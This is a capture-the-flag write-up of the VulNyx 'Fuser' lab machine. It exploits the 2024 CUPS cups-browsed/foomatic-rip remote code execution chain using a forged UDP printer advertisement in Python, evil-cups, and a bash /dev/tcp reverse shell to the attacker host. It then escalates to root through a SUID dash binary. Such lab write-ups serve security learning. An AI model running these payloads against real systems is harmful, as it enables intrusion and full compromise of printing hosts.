# Fuser

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Fuser | d4t4s3c | Low | VulNyx |

**Summary:** The Fuser machine is a quiet one that hides its entire attack surface behind a piece of infrastructure most pentesters forget: the Common UNIX Printing System. TCP scans exposed SSH, a bare Apache instance, and CUPS on port 631, while the web server returned nothing but a default landing page. The CUPS administrative interface announced the service version, CUPS 2.3.3op2, along with a preexisting printer named Konika Minolta, a version string that falls inside the four CVE chain disclosed in late 2024 as the "Evil Printing" exploit. The chain begins when an attacker sends a single UDP browse packet to port 631, because cups-browsed binds a listener to every interface and trusts any incoming advertisement. The victim's daemon connects back to a malicious IPP server, and the returned attributes pass through libcupsfilters unvalidated, letting libppd write a newline terminated PPD directive verbatim into a temporary printer description file. That directive plants a `FoomaticRIPCommandLine` entry and a `cupsFilter2` line that routes every print job through foomatic-rip, which executes the attacker's command when a job is submitted. Triggering the CUPS test page fired a bash reverse shell back to the operator as the lp user. The final step was trivial, because a filesystem SUID search revealed that the dash binary carries the setuid bit. Running `/usr/bin/dash -p` preserves the effective UID of root, spawning a privileged shell, and both the user flag under /home/toner and the root flag under /root were recovered. A forgotten printer service, chained across four vulnerabilities, escalated all the way to root.

---

## Reconnaissance

The engagement opened with a host discovery sweep, followed by service scans.

1. The target was identified at `192.168.56.130`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ping -c 3 192.168.56.130
PING 192.168.56.130 (192.168.56.130) 56(84) bytes of data.
64 bytes from 192.168.56.130: icmp_seq=1 ttl=64 time=0.601 ms
64 bytes from 192.168.56.130: icmp_seq=2 ttl=64 time=0.627 ms
64 bytes from 192.168.56.130: icmp_seq=3 ttl=64 time=2.27 ms

--- 192.168.56.130 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2056ms
rtt min/avg/max/mdev = 0.601/1.166/2.270/0.780 ms

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.130
```

2. A full port scan exposed three TCP services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -sC -sV -T4 $ip -oN nmap_initial.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 06:31 -0400
Nmap scan report for 192.168.56.130 (192.168.56.130)
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey:
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Site doesn't have a title (text/html).
631/tcp open  ipp     CUPS 2.3
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Inicio - CUPS 2.3.3op2
MAC Address: 08:00:27:91:1D:10 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
```

3. The web server was fetched to see what it presented:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s -i http://$ip/
HTTP/1.1 200 OK
Date: Wed, 19 Aug 2026 10:33:07 GMT
Server: Apache/2.4.56 (Debian)
Last-Modified: Fri, 01 Nov 2024 07:04:59 GMT
ETag: "bb-625d48d999e68"
Accept-Ranges: bytes
Content-Length: 187
Vary: Accept-Encoding
Content-Type: text/html

<html>
<body>
  <h1>It works!</h1>
  <p>This is the default web page for this server.</p>
  <p>The web server software is running but no content has been added, yet.</p>
</body>
</html>
```

The Apache instance had no application content, and the robots.txt path answered with a 404, so the web server offered no vector.

4. The CUPS service on port 631 was inspected, and the banner immediately exposed the version:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip:631/ | head -20
<!DOCTYPE HTML>
<html>
  <head>
    <link rel="stylesheet" href="/cups.css" type="text/css">
    <link rel="shortcut icon" href="/apple-touch-icon.png" type="image/png">
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <meta name="viewport" content="width=device-width">
    <title>Inicio - CUPS 2.3.3op2</title>
  </head>
```

The management interface rendered in Spanish and listed a preexisting printer named Konika Minolta. The version, CUPS 2.3.3op2, sits squarely inside the vulnerable range of the September 2024 CUPS RCE chain, making port 631 the primary avenue of attack.

---

## Initial Access

### The Evil Printing CUPS Exploit Chain

5. The version was matched against the four CVE chain disclosed by Simone Margaritelli:

```
https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8
```

The chain links CVE-2024-47176 in cups-browsed, which trusts unsolicited UDP browse packets on port 631, to CVE-2024-47076 in libcupsfilters, which passes attacker controlled IPP attributes through without sanitization. CVE-2024-47175 in libppd then writes those attributes verbatim into a temporary PPD file, and CVE-2024-47177 lets the foomatic-rip filter execute the injected `FoomaticRIPCommandLine` directive. The trigger is a print job, so the operator must force the fake printer to process one.

6. The exploit tooling was IppSec's evil-cups, cloned locally. The attacker machine holds the address `192.168.56.104` on the same subnet, and the malicious IPP server binds to port 12345 while a reverse shell listener waits on port 4444:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ip -4 addr show | grep 192.168.56
    inet 192.168.56.104/24 brd 192.168.56.255 scope global dynamic noproute eth1

┌──(kali㉿kali)-[~/nyx/evil-cups]
└─$ cat requirements.txt
ippserver

┌──(kali㉿kali)-[~/nyx/evil-cups]
└─$ ./env/bin/python evilcups.py
usage: evilcups.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>
```

7. The reverse shell listener was started, then the exploit was launched with the command to inject:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(kali㉿kali)-[~/nyx/evil-cups]
└─$ ./env/bin/python evilcups.py 192.168.56.104 192.168.56.130 "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.104/4444 0>&1'"
IPP Server Listening on ('192.168.56.104', 12345)
Sending udp packet to 192.168.56.130:631...
Please wait this normally takes 30 seconds...
0 elapsed
target connected, sending payload ...
1 elapsed
2 elapsed
```

The banner `target connected, sending payload ...` proved that cups-browsed on the victim had reached back to the malicious server and received the poisoned printer attributes. The UDP packet that triggered it carries the printer URI pointing at the attacker's IPP server:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ python3 -c "
import socket
printer_type = 2; state = '3'
uri = 'http://192.168.56.104:12345/printers/EVILCUPS'
loc = '\"You Have Been Hacked\"'; info = '\"HACKED\"'; model = '\"HP LaserJet 1020\"'
packet = f'{printer_type:x} {state} {uri} {loc} {info} {model} \n'
print(repr(packet))
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(packet.encode(), ('192.168.56.130', 631))
"
'2 3 http://192.168.56.104:12345/printers/EVILCUPS "You Have Been Hacked" "HACKED" "HP LaserJet 1020" \n'
```

8. The CUPS web interface confirmed that the fake printer had been installed:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s "http://$ip:631/printers/" | grep -oiE 'printers/[a-z0-9_-]+' | sort -u
printers/HACKED_192_168_56_104
printers/Konika
printers/Pwned_Printer_192_168_56_104
```

9. One operational pitfall appeared during the engagement. If the malicious IPP server is stopped at any moment, the fake printer's device URI becomes unreachable and cupsd marks the queue as paused. Paused printers hold every incoming job, so the injected command never executes. The reliable fix is to keep the IPP server alive and force cups-browsed to register a brand new queue, with a distinct printer name, while the server is up. The fresh queue arrives in the idle state and accepts jobs immediately:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ python3 -c "
import socket
printer_type = 2; state = '3'
uri = 'http://192.168.56.104:12345/printers/EVILCUPS'
loc = '\"Fresh Location\"'; info = '\"FRESH\"'; model = '\"HP LaserJet 1020\"'
packet = f'{printer_type:x} {state} {uri} {loc} {info} {model} \n'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(packet.encode(), ('192.168.56.130', 631))
print('sent')
"
sent

┌──(kali㉿kali)-[~/nyx]
└─$ sleep 15; curl -s "http://$ip:631/printers/" | grep -oiE 'printers/[a-z0-9_-]+' | sort -u
printers/FRESH_192_168_56_104
printers/HACKED_192_168_56_104
printers/Konika
printers/Pwned_Printer_192_168_56_104
```

10. The print test page was submitted against the fresh queue to detonate the payload:

```bash
┌──(kali㉿kali)-[~/nyx/PoC-Cups-RCE-CVE-exploit-chain]
└─$ ./env/bin/python send_print_request.py 192.168.56.130 FRESH_192_168_56_104
Status Code: 200
Test page successfully sent to the printer.
```

11. Submitting the test page forced foomatic-rip to read the poisoned PPD and run the injected command. The reverse shell connected back to the listener:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ cat /tmp/handler_status.txt
listening on 4444
connection from ('192.168.56.130', 49246)
ready: write commands to /tmp/cmds.txt
```

12. The shell landed as the lp user, the standard account under which CUPS runs its filters:

```bash
lp@fuser:/$ id
uid=7(lp) gid=7(lp) groups=7(lp)
lp@fuser:/$ whoami
lp
lp@fuser:/$ hostname
fuser
lp@fuser:/$ pwd
/
```

---

## Privilege Escalation

### Root Through the SUID dash Binary

13. A filesystem wide SUID search exposed the escalation primitive:

```bash
lp@fuser:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/dash
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
```

Among the expected setuid binaries sits `/usr/bin/dash`, the Debian Almquist shell, carrying the SUID bit. A SUID shell allows any user to execute it with the effective privileges of its owner, which is root, and dash exposes the `-p` flag precisely to run in privileged mode while preserving those elevated IDs instead of dropping them.

14. The account structure confirmed a dedicated user named toner whose home directory holds the user flag:

```bash
lp@fuser:/$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Nov  1  2024 .
drwxr-xr-x 18 root  root  4096 Oct 26  2023 ..
drwx------  3 toner toner 4096 Nov  1  2024 toner

lp@fuser:/$ grep -E "toner|lp:" /etc/passwd
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
toner:x:1000:1000:toner:/home/toner:/bin/bash
```

15. The escalation was a single command. Invoking dash in privileged mode and checking identity showed the effective UID dropping to zero while the real UID remained lp, exactly the behavior needed to act as root:

```bash
lp@fuser:/$ /usr/bin/dash -p
# id
uid=7(lp) gid=7(lp) euid=0(root) groups=7(lp)
# whoami
root
```

16. With root privileges confirmed, both flags were recovered:

```bash
# ls -la /root
total 28
drwx------  3 root root 4096 Nov  1  2024 .
drwxr-xr-x 18 root root 4096 Oct 26  2023 ..
lrwxrwxrwx  1 root root    9 Oct 26  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 Jan 15  2023 .bashrc
drwxr-xr-x  3 root root 4096 Nov  1  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 Oct 26  2023 .selected_editor
-r--------  1 root root   33 Nov  1  2024 root.txt

# cat /root/root.txt /home/toner/user.txt
```

---

## Attack Chain Summary

1. **Reconnaissance**: A ping confirmed the target at `192.168.56.130`, and a full port scan exposed SSH on port 22, Apache on port 80, and the CUPS printing service on port 631. The web server offered nothing but a default page.

2. **Vulnerability Discovery**: The CUPS administrative interface announced version 2.3.3op2, which falls inside the vulnerable range of the four CVE chain affecting cups-browsed, libcupsfilters, libppd, and foomatic-rip. The service also listed a preexisting printer, confirming active printing infrastructure.

3. **Exploitation**: A UDP browse packet advertised a fake printer backed by an attacker controlled IPP server. cups-browsed connected to that server, and the returned attributes injected a `FoomaticRIPCommandLine` directive into the generated PPD. Submitting the CUPS test page forced foomatic-rip to execute a bash reverse shell, granting a foothold as the lp user.

4. **Internal Enumeration**: A SUID search across the filesystem revealed that `/usr/bin/dash` carries the setuid bit, an unusual and exploitable configuration. The account structure confirmed a dedicated user, toner, whose home directory stored the user flag.

5. **Privilege Escalation**: Running `/usr/bin/dash -p` preserved the effective UID of root, producing a privileged shell. The user flag was read from /home/toner/user.txt and the root flag from /root/root.txt, completing the compromise.
